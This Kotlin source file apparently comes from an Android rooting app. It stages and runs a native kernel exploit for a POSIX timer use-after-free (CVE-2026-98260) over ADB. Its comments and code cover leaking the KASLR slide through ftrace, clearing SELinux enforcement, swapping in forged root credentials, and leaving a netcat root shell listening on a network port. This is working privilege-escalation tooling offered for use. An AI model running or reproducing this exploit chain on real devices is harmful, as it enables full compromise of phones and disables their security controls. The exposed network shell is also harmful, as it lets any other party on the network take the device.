package com.hexo141.liquidglass.root

import android.content.Context
import com.hexo141.liquidglass.R
import com.hexo141.liquidglass.adb.AbsAdbConnectionManager
import com.hexo141.liquidglass.adb.AdbShell
import com.hexo141.liquidglass.bootimg.Cve98260Profile
import com.hexo141.liquidglass.bootimg.ProfileStore
import com.hexo141.liquidglass.device.DeviceInfo
import java.io.File

/**
 * Fifth engine: CVE-2026-98260, the POSIX CPU timer `exec()` use-after-free.
 *
 * `execve()` frees the calling thread group's `k_itimer` objects while the timer expiry path may
 * still hold a reference to one of them. The payload spends that dangling node to get a one-shot
 * kernel pointer write, clears `selinux_state.enforcing`, then points `current->cred` at a forged
 * credential page in a reclaimed socket buffer and pins that page with a resident child.
 *
 * Two things make this engine different from the other four:
 *
 * - **It carries its own orchestration.** The other payloads take a profile and run a fixed
 *   sequence; this one calibrates the KASLR slide and `page_offset` itself, then decides how many
 *   rounds it needs. The runner only stages files, starts it and reads the result.
 * - **Its profile is not GLK1.** It needs link-time symbol addresses (`do_timer_create+0xA8`,
 *   `prepare_creds+0x24`, `selinux_state`, `init_user_ns`, `root_user`, `init_groups`,
 *   `init_ucounts`) plus the forged-cred layout, which is what [Cve98260Profile] holds. The same
 *   `boot.img` parse produces both profiles.
 *
 * After the uid is cleared the payload `exec`s the staged `bootstrap` (`OPENROOT_HANDOFF`), so the
 * KernelSU late-load / root command channel decision is made in one place for every engine.
 */
object Cve98260Runner {
    private const val STAGE_DIR = "/data/local/tmp/openroot"
    private const val PAYLOAD = "libcve98260.so"
    private const val PROFILE = "c98260.conf"
    private const val BOOTSTRAP = "libopenbootstrap.so"
    private const val BOOTSTRAP_REMOTE = "loader"

    /** `--kaslr-only` prints exactly one of these; nothing else in the stream matches. */
    private const val SLIDE_MARKER = "C98260_SLIDE=0x"

    /**
     * Backstop for a payload that only printed the human-readable line.
     *
     * 71b7db6 replaced the `printf("C98260_SLIDE=…")` protocol line with `LOG_LEAK("[slide] …")`,
     * so builds after it leaked the slide into the log and still reported "no slide". The payload
     * prints the marker again, but a stale copy left in `/data/local/tmp/openroot` (push that
     * silently failed, or a device that skipped the staging fix) would still hit the old build —
     * the value in the log is identical either way, so parse it too.
     */
    private val SLIDE_LOG_LINE = Regex("""(?:仅泄露 KASLR slide[：:]|\[slide\] )0x([0-9a-fA-F]+)""")

    /** Printed by `--selinux-only` when the payload stops before touching cred. */
    private const val SELINUX_ONLY_DONE = "C98260_SELINUX_ONLY_DONE=1"

    /** Present when `--skip-selinux-check` was used: the write ran, enforce was not read back. */
    private const val SELINUX_ONLY_UNVERIFIED = "C98260_SELINUX_UNVERIFIED=1"

    /** Bundled tables the payload carries for these two releases; anything else needs a parse. */
    private val BUNDLED_RELEASES = listOf("6.1.134", "6.6.118")

    data class Result(
        val exitCode: Int,
        val handoff: RootHandoff.Result,
    )

    fun isPayloadPresent(context: Context): Boolean =
        File(context.applicationInfo.nativeLibraryDir, PAYLOAD).isFile

    /**
     * Fails the run when the staged file does not have the exact size of the APK copy.
     *
     * The push path is a shell pipeline (`cat > tmp && mv`), so a permission problem, a full
     * `/data/local/tmp` or an interrupted stream shows up as a shorter file rather than an
     * exception. Comparing sizes is cheap and turns that into one clear error.
     */
    private fun verifyStaged(manager: AbsAdbConnectionManager, remotePath: String, expected: Long) {
        // The rename runs after the byte stream closes, so allow a few short polls instead of
        // failing on a file that is still being moved into place.
        var actual: Long? = null
        for (attempt in 0 until 10) {
            actual = AdbShell.exec(manager, "wc -c < '$remotePath' 2>/dev/null")
                .trim().toLongOrNull()
            if (actual == expected) return
            Thread.sleep(100)
        }
        if (actual != expected) {
            throw IllegalStateException(
                "staged $remotePath is ${actual ?: "missing"} bytes, expected $expected"
            )
        }
    }

    /** A parsed profile for this exact release, or the two releases the payload has built in. */
    fun hasProfile(context: Context, release: String): Boolean {
        if (release.isEmpty()) return false
        // A file that no longer parses is not a profile: fall back to the built-in table instead
        // of handing the payload half a snapshot.
        val parsed = ProfileStore.loadC98260(context, release)
            ?.let { Cve98260Profile.parse(it) } != null
        return parsed || BUNDLED_RELEASES.any { release.startsWith(it) }
    }

    /** The bug landed in 5.7; older trees cannot reach the `exec()` timer-free path at all. */
    fun kernelSupports(release: String): Boolean {
        val head = release.takeWhile { it.isDigit() || it == '.' }
        val parts = head.split('.').mapNotNull { it.toIntOrNull() }
        val major = parts.getOrNull(0) ?: return false
        val minor = parts.getOrNull(1) ?: 0
        return major > 5 || (major == 5 && minor >= 7)
    }

    fun isSupported(context: Context, info: DeviceInfo): Boolean =
        kernelSupports(info.kernel) && hasProfile(context, info.kernel)

    /** Engine name for the status card, or {@code null} when this kernel cannot be covered. */
    fun describe(context: Context, info: DeviceInfo): String? =
        if (isSupported(context, info)) "CVE-2026-98260" else null

    /**
     * Stages the payload, its profile and the root handoff, then runs it as the `shell` user.
     *
     * @param profile parsed 98260 snapshot for this release; {@code null} lets the payload fall
     *        back to its built-in table, which only exists for [BUNDLED_RELEASES]
     * @param slide KASLR slide resolved elsewhere (manually or by [resolveSlide]); {@code null}
     *        lets the payload calibrate it itself
     * @param selinuxOnly stop right after `selinux_enforcing` is cleared: no cred rewrite, no
     *        bootstrap, no handoff probe. The payload prints `C98260_SELINUX_ONLY_DONE=1`
     *        (plus `C98260_SELINUX_UNVERIFIED=1` when the enforce readback was skipped). Passing
     *        `--selinux-only` inside [extraArgs] has the same effect and is what the options sheet
     *        does now.
     * @param extraArgs arguments from the 98260 options sheet, already in payload order. Only the
     *        switches this app does not own arrive here: `--slide`, `--profile`, `--color` and
     *        `--no-ksu` are built above.
     */
    @Throws(Exception::class)
    fun run(
        context: Context,
        manager: AbsAdbConnectionManager,
        release: String,
        profile: Cve98260Profile?,
        suManager: KsuManager.Target?,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
        slide: Long? = null,
        selinuxOnly: Boolean = false,
        extraArgs: List<String> = emptyList(),
    ): Result {
        val payloadFile = File(context.applicationInfo.nativeLibraryDir, PAYLOAD)
        require(payloadFile.isFile) {
            "Payload is not packaged for this ABI (${payloadFile.absolutePath})"
        }
        val bootstrap = File(context.applicationInfo.nativeLibraryDir, BOOTSTRAP)
        require(bootstrap.isFile) { "bootstrap is not packaged for this ABI" }

        onProgress(0.04f)
        onLine(
            AdbShell.stagedLine(
                STAGE_DIR,
                listOfNotNull(
                    PAYLOAD, BOOTSTRAP_REMOTE, "openroot.xml",
                    suManager?.let { "ksud" }, profile?.let { PROFILE },
                ),
            )
        )
        // Drop the previous copy first. `push` already renames over it, but a stale
        // `libcve98260.so` left resident by `--daemon-exit` (or by a stopped `--exec-hold`
        // child) keeps the old inode alive, and a user comparing timestamps would still see the
        // old build. Removing the directory entry makes the next run unambiguous.
        AdbShell.exec(
            manager,
            "mkdir -p $STAGE_DIR && rm -f $STAGE_DIR/$PAYLOAD $STAGE_DIR/$BOOTSTRAP_REMOTE " +
                "$STAGE_DIR/$PAYLOAD.push $STAGE_DIR/$BOOTSTRAP_REMOTE.push",
        )

        AdbShell.push(manager, "$STAGE_DIR/$PAYLOAD", payloadFile.readBytes())
        onProgress(0.12f)
        // A silent ETXTBSY used to leave the device on the previous build while the app showed
        // the new one. Compare sizes so a truncated or skipped stage fails here, not in the log.
        verifyStaged(manager, "$STAGE_DIR/$PAYLOAD", payloadFile.length())
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$PAYLOAD")

        // The handoff target: bootstrap reads openroot.xml and decides late-load vs command channel.
        AdbShell.push(manager, "$STAGE_DIR/$BOOTSTRAP_REMOTE", bootstrap.readBytes())
        verifyStaged(manager, "$STAGE_DIR/$BOOTSTRAP_REMOTE", bootstrap.length())
        onProgress(0.2f)
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")

        val managerValue = suManager?.packageName.orEmpty().ifEmpty { "none" }
        val prefs = """
            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
            <map>
                <string name="su_manager">$managerValue</string>
                <boolean name="soft_reboot" value="false" />
                <boolean name="disable_modules" value="false" />
            </map>
        """.trimIndent().toByteArray()
        AdbShell.push(manager, "$STAGE_DIR/openroot.xml", prefs)
        onProgress(0.26f)
        AdbShell.exec(manager, "chmod 644 $STAGE_DIR/openroot.xml")

        if (suManager != null) {
            val copy = AdbShell.exec(
                manager,
                "cp '${suManager.ksudPath}' $STAGE_DIR/ksud && chmod 755 $STAGE_DIR/ksud && echo ok",
            )
            onProgress(0.32f)
            if (!copy.contains("ok")) {
                onLine(copy.trim())
                throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
            }
        }

        val profileArg = if (profile != null) {
            AdbShell.push(
                manager,
                "$STAGE_DIR/$PROFILE",
                profile.toHocon("parsed on device").toByteArray(),
            )
            AdbShell.exec(manager, "chmod 644 $STAGE_DIR/$PROFILE")
            onProgress(0.36f)
            onLine(
                "$ [profile] ${profile.release} - timer_link=0x" +
                    java.lang.Long.toHexString(profile.timerLink) +
                    " cred_link=0x" + java.lang.Long.toHexString(profile.credLink)
            )
            " --profile $PROFILE"
        } else {
            onLine("<i> no parsed profile for $release; the payload's built-in table is used")
            ""
        }
        val slideArg = slide?.let { " --slide 0x" + java.lang.Long.toHexString(it) }.orEmpty()
        // `--selinux-only` arrives two ways: the dedicated flag, or the options sheet (which now
        // owns every argument, mode chips included). Collapse them so the switch is never emitted
        // twice, and so the verdict below works whichever route the caller took.
        val stopAfterSelinux = selinuxOnly || extraArgs.contains("--selinux-only")
        val modeArg =
            if (selinuxOnly && !extraArgs.contains("--selinux-only")) " --selinux-only" else ""
        val extraArg = if (extraArgs.isEmpty()) "" else
            " " + extraArgs.joinToString(" ") { shellQuote(it) }
        // A successful full run leaves the parent waiting for the child that pins the forged cred
        // page, by design - on a terminal that is a feature. Here it means every run would sit on
        // the stream until the watchdog fires, so the app asks for the documented handoff instead:
        // the child turns daemon and keeps the page, the parent returns and the log stays live.
        val lifecycleArg =
            if (!stopAfterSelinux && !skipsHandoff(extraArgs)) " --daemon-exit" else ""

        onLine("$ cd $STAGE_DIR && OPENROOT_HANDOFF=$STAGE_DIR/$BOOTSTRAP_REMOTE " +
            "./$PAYLOAD --color=never --no-ksu$profileArg$slideArg$modeArg$extraArg$lifecycleArg")
        var selinuxDone = false
        var selinuxUnverified = false
        // This payload version does not stage `bootstrap`: the root it leaves behind is the
        // netcat shell it forks at the end. Keeping its port lets a successful run say so instead
        // of inheriting the bootstrap probe's "did not run" verdict.
        var netshellPort: Int? = null
        val exitCode = AdbShell.stream(
            manager,
            "cd $STAGE_DIR && TMPDIR=$STAGE_DIR HOME=$STAGE_DIR " +
                "OPENROOT_HANDOFF=$STAGE_DIR/$BOOTSTRAP_REMOTE C98260_VERBOSE=1 " +
                "./$PAYLOAD --color=never --no-ksu$profileArg$slideArg$modeArg$extraArg$lifecycleArg 2>&1",
            { line ->
                // The SELinux verdict arrives as a `C98260_*` protocol line, which is not shown
                // in the log - read it from the raw line, not from what survives filtering.
                if (line.contains(SELINUX_ONLY_DONE)) selinuxDone = true
                if (line.contains(SELINUX_ONLY_UNVERIFIED)) selinuxUnverified = true
                if (netshellPort == null && line.contains("网络终端已开放")) {
                    val at = line.lastIndexOf("端口 ")
                    if (at >= 0) {
                        netshellPort = line.substring(at + 3).trim()
                            .takeWhile { it.isDigit() }.toIntOrNull()
                    }
                }
                val cleaned = cleanStatus(line)
                if (cleaned.isNotEmpty()) {
                    stageProgress(cleaned)?.let(onProgress)
                    onLine(cleaned)
                }
            },
            // One priming round can be silent for a minute, and the payload runs up to twelve of
            // them for SELinux plus twelve more for the credential.
            idleTimeoutMs = 600_000,
        )
        onProgress(0.92f)

        if (stopAfterSelinux) {
            onProgress(1f)
            val detail = when {
                selinuxUnverified -> "SELinux write executed, enforce not read back"
                selinuxDone -> "SELinux is permissive"
                else -> "SELinux was not confirmed permissive"
            }
            return Result(exitCode, RootHandoff.Result(RootHandoff.State.NONE, emptySet(), detail))
        }

        // The argument modes end inside the payload; there is no root to hand off.
        if (skipsHandoff(extraArgs)) {
            onProgress(1f)
            return Result(
                exitCode,
                RootHandoff.Result(
                    RootHandoff.State.NONE,
                    emptySet(),
                    "finished before the root handoff",
                ),
            )
        }

        val handoff = RootHandoff.probe(manager, onLine, waitMs = 20_000)
        onProgress(1f)
        // The dfm markers belong to `bootstrap`, which this payload never runs. When the run
        // succeeded and the root shell came up, say that instead of "bootstrap did not run".
        val port = netshellPort
        if (handoff.state == RootHandoff.State.NONE && exitCode == 0 && port != null) {
            return Result(
                exitCode,
                RootHandoff.Result(
                    RootHandoff.State.NONE,
                    handoff.markers,
                    "root shell is listening on port $port",
                ),
            )
        }
        return Result(exitCode, handoff)
    }

    /**
     * True for the modes that end inside the payload.
     *
     * `--lmap-only`, `--cred-only`, `--selinux-only`, the address gate, the profile dump and every
     * `--poke*` return before the cred rewrite. Probing for a handoff afterwards would stall on its
     * timeout and then report "no root" for a run that never promised one.
     */
    private fun skipsHandoff(args: List<String>): Boolean = args.any {
        it == "--lmap-only" || it == "--cred-only" || it == "--selinux-only" ||
            it == "--check-target" || it == "--dump-config" || it == "--test-log" ||
            it.startsWith("--poke")
    }

    /**
     * The command line goes through `sh -c` on the device, so a value with spaces (`--exec`'s
     * command) has to survive the shell. Plain flags and hex addresses are left bare, which keeps
     * the echoed line readable.
     */
    private fun shellQuote(arg: String): String {
        if (arg.isNotEmpty() && arg.all { it.isLetterOrDigit() || it in "-_./:=+@," }) return arg
        return "'" + arg.replace("'", "'\\''") + "'"
    }

    /**
     * Calibration A only: the payload creates a burst of POSIX CPU timers, reads the
     * `kmem_cache_alloc` call site out of the raw ftrace buffer and prints the slide, then exits
     * without touching kernel state. This is the automatic half of the KASLR card; the manual half
     * skips the device work entirely and just feeds the value back through `--slide`.
     *
     * Needs the same `shell` channel as the real run, because it must write to tracefs.
     *
     * @return the slide the payload reported, or {@code null} when it never printed one
     */
    @Throws(Exception::class)
    fun resolveSlide(
        context: Context,
        manager: AbsAdbConnectionManager,
        release: String,
        profile: Cve98260Profile?,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
    ): Long? {
        val payloadFile = File(context.applicationInfo.nativeLibraryDir, PAYLOAD)
        require(payloadFile.isFile) {
            "Payload is not packaged for this ABI (${payloadFile.absolutePath})"
        }

        onProgress(0.05f)
        onLine(AdbShell.stagedLine(STAGE_DIR, listOfNotNull(PAYLOAD, profile?.let { PROFILE })))
        AdbShell.exec(manager, "mkdir -p $STAGE_DIR")
        AdbShell.push(manager, "$STAGE_DIR/$PAYLOAD", payloadFile.readBytes())
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$PAYLOAD")
        onProgress(0.28f)

        val profileArg = if (profile != null) {
            AdbShell.push(
                manager,
                "$STAGE_DIR/$PROFILE",
                profile.toHocon("parsed on device").toByteArray(),
            )
            AdbShell.exec(manager, "chmod 644 $STAGE_DIR/$PROFILE")
            onLine(
                "$ [profile] ${profile.release} - timer_link=0x" +
                    java.lang.Long.toHexString(profile.timerLink)
            )
            onProgress(0.42f)
            " --profile $PROFILE"
        } else {
            onLine("<i> no parsed profile for $release; the built-in table is used")
            ""
        }

        var slide: Long? = null
        onLine("$ cd $STAGE_DIR && ./$PAYLOAD --color=never --no-ksu --kaslr-only$profileArg")
        AdbShell.stream(
            manager,
            "cd $STAGE_DIR && TMPDIR=$STAGE_DIR HOME=$STAGE_DIR " +
                "./$PAYLOAD --color=never --no-ksu --kaslr-only$profileArg 2>&1",
            { line ->
                // `C98260_SLIDE=0x…` is a protocol line and never reaches the log, so it has to
                // be read here, from the raw line, before filtering drops it.
                if (slide == null) {
                    val at = line.indexOf(SLIDE_MARKER)
                    if (at >= 0) {
                        val raw = line.substring(at + SLIDE_MARKER.length).trim()
                        val end = raw.indexOfFirst { !it.isLetterOrDigit() }
                        val value = if (end < 0) raw else raw.substring(0, end)
                        slide = value.toLongOrNull(16)
                    } else {
                        slide = SLIDE_LOG_LINE.find(line)
                            ?.groupValues?.get(1)?.toLongOrNull(16)
                    }
                }
                val cleaned = cleanStatus(line)
                if (cleaned.isNotEmpty()) onLine(cleaned)
            },
            // One priming round can be silent for a minute; calibration A is a single round.
            idleTimeoutMs = 180_000,
        )
        onProgress(1f)
        // One sentence for the whole failure. The payload says it four more times (tracefs
        // unarmed, stage failed, elapsed time, done marker) and the runner used to add two lines
        // of its own on top; the user needs the verdict, not the transcript.
        if (slide == null) onLine("[-] " + context.getString(R.string.kaslr_no_slide))
        return slide
    }

    /**
     * Drops the payload's machine protocol and its own progress chatter from the log.
     *
     * `\x1eC98260_STATUS <stage> <status>` is how the payload reports stage changes, and the whole
     * `C98260_*` family is host-side protocol that was never meant to be read by a person. On a
     * failed calibration the payload also prints the tracefs error, a `[calib_a]` failure line, two
     * `[耗时]` timers and a `DONE=0` marker - five ways of saying what the runner now says once.
     */
    private fun cleanStatus(line: String): String {
        val marker = "\u001eC98260_STATUS"
        if (line.contains(marker)) {
            val rest = line.substringAfter(marker).trim()
            // calib_a finishes in a fraction of a second and only matters when it fails, which is
            // reported by the runner itself; its running/failed pair was pure noise.
            if (rest.isEmpty() || rest.startsWith("calib_a")) return ""
            return "[stage] " + rest.replace(' ', ':')
        }
        val text = line.trimStart()
        return when {
            text.startsWith("C98260_") -> ""
            text.startsWith("[耗时]") -> ""
            text.startsWith("[calib_a]") -> ""
            // Only reachable when the kernel refused the tracefs event, which is the same failure.
            text.startsWith("无法启用 ") -> ""
            else -> line.trimEnd()
        }
    }

    /** Maps the payload's own progress markers onto the bar; {@code null} leaves it untouched. */
    private fun stageProgress(line: String): Float? = when {
        line.contains("[stage] inject:running") -> 0.5f
        line.contains("[stage] verify:ok") -> 0.86f
        line.contains("[stage] ksu:running") -> 0.9f
        line.contains("[stage] ksu:ok") -> 0.95f
        line.contains("[stage] ksu:failed") -> 0.95f
        line.contains("[stage] inject:failed") -> 0.95f
        else -> null
    }
}
